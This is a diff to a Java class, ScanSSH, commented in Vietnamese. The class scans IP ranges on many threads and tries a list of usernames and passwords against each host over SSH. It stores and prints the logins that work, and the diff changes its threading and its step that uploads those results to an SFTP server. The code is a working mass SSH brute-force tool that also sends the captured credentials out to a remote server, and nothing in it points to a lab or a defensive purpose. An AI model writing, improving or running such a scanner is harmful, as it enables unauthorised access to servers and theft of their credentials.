@@ -31,6 +31,7 @@ public class ScanSSH {
     private int CurrentThreadActive = 0;
     // du lieu de ssh hoat dong
     private static Object syncObj = new Object();
+    private Object ObjThread = new Object();
 
     private Thread[] thread;
     private Thread ThreadCheckStop;
@@ -47,7 +48,7 @@ public class ScanSSH {
     private int TimeOut = 15;
     private int CountIpRange = 0;
     private int IndexOfListRange = 0;
-    private boolean flag = false;
+    private boolean flag = true;
     @Autowired
     IPService iPService;
     @Autowired
@@ -60,6 +61,8 @@ public class ScanSSH {
         String Message = "";
         //tao list range ip
         ListsRangeIp = iPService.getListRange(ListsRange);
+        //tinh tong range
+        TotalRange = ListsRangeIp.size();
         //tinh tong ip
 
         TotalIps = iPService.getTotalIps(ListsRangeIp);
@@ -86,6 +89,20 @@ public class ScanSSH {
             Run(i);
             Thread.sleep(100);
         }
+
+        Thread manager = new Thread() {
+            @Override
+            public void run() {
+                try {
+                    manager();
+                } catch (Exception e) {
+                    e.getMessage();
+                }
+
+            }
+        };
+        manager.start();
+
         //tao thread check viec dung
         ThreadCheckStop = new Thread() {
             @Override
@@ -99,29 +116,33 @@ public class ScanSSH {
             }
         };
         Thread.sleep(60000);
-        //ThreadCheckStop.start();
+        ThreadCheckStop.start();
+
     }
 
     public void CheckStopAndUpload() throws FileNotFoundException {
+//true
+        if (thread.length == NumberOfThreads) {
+            while (true) {
+                try {
+                    if (!flag) {
+                        uploadService.uploadFileTempToSFtpServer(ListsResultIps);
+                        flag = true;
+                        break;
+                    } else {
+                        //false
+                        flag = false;
+                        for (int i = 0; i < thread.length; i++) {
 
-        while (true) {
-            try {
-                if (!flag) {
-                    uploadService.uploadFileTempToSFtpServer(ListsResultIps);
-                    flag = false;
-                    break;
-                } else {
-                    flag = true;
-                    for (int i = 0; i < thread.length; i++) {
+                            flag = flag || thread[i].isAlive();
+                        }
 
-                        flag = flag && !thread[i].isAlive();
                     }
-
+                } catch (Exception e) {
+                    e.getMessage();
                 }
-            } catch (Exception e) {
-                e.getMessage();
-            }
 
+            }
         }
 
     }
@@ -143,12 +164,11 @@ public class ScanSSH {
         thread[id_thread].start();
     }
 
-    public void stop() {
+    public void manager() {
         try {
-            for (int i = 0; i < NumberOfThreads; i++) {
-                if (!thread[i].isAlive()) {
-
-                }
+            while (true) {
+                Thread.sleep(2000);
+                System.out.println(" CurrentThreadActive: " + CurrentThreadActive);
             }
 
         } catch (Exception e) {
@@ -157,18 +177,23 @@ public class ScanSSH {
     }
 
     public void Check_USER_PASS_START(int id_thread) {
-        String IpTemp = "";
+        String S_IpBeginTemp = "";
+        long L_IpEndTemp = 0;
+        long L_IpBeginTemp = 0;
         try {
             while (true) {
                 synchronized (syncObj) {
                     //kiem tra con range trong list range khong
-                    if (IndexOfListRange <= TotalRange) {
+                    if (IndexOfListRange < TotalRange) {
 
                         Long_IpRangeEndFocus = iPService.ipToLong2(ListsRangeIp.get(IndexOfListRange).getRangeEnd());
                         Long_IpRangeFocus = iPService.ipToLong2(ListsRangeIp.get(IndexOfListRange).getRangeBegin()) + CountIpRange;
                         //ip con trong range khong con thi lam
+                        S_IpBeginTemp = iPService.longToIp2(Long_IpRangeFocus);
+                        L_IpEndTemp = Long_IpRangeEndFocus;
+                        L_IpBeginTemp = Long_IpRangeFocus;
                         if (Long_IpRangeFocus <= Long_IpRangeEndFocus) {
-                            IpTemp = iPService.longToIp2(Long_IpRangeFocus);
+
                             CountIpRange++;
                             TotalIpsChecked++;
                         } else {
@@ -183,22 +208,29 @@ public class ScanSSH {
                     }
 
                 }
+                synchronized (ObjThread) {
+                    CurrentThreadActive++;
+                }
+                if (L_IpBeginTemp <= L_IpEndTemp) {
+                    for (int i = 0; i < ListsUserPass.size(); i++) {
+                        byte check = CHECK_LIVE(S_IpBeginTemp, ListsUserPass.get(i).getUsername(), ListsUserPass.get(i).getPassword(), id_thread);
+                        System.out.println("ip :" + S_IpBeginTemp + " user :" + ListsUserPass.get(i).getUsername() + " pass : " + ListsUserPass.get(i).getPassword());
+                        if (check == 1) {
 
-                for (int i = 0; i < ListsUserPass.size(); i++) {
-                    byte check = CHECK_LIVE(IpTemp, ListsUserPass.get(i).getUsername(), ListsUserPass.get(i).getPassword(), id_thread);
-                    if (check == 1) {
+                            InfoToConnectSSH info = new InfoToConnectSSH();
+                            info.setHost(S_IpBeginTemp);
+                            info.setUsername(ListsUserPass.get(i).getUsername());
+                            info.setPassword(ListsUserPass.get(i).getPassword());
 
-                        InfoToConnectSSH info = new InfoToConnectSSH();
-                        info.setHost(IpTemp);
-                        info.setUsername(ListsUserPass.get(i).getUsername());
-                        info.setPassword(ListsUserPass.get(i).getPassword());
+                            ListsResultIps.add(info);
 
-                        ListsResultIps.add(info);
-
-                        break;
+                            break;
+                        }
                     }
                 }
-
+                synchronized (ObjThread) {
+                    CurrentThreadActive--;
+                }
             }
         } catch (Exception e) {
             e.getMessage();
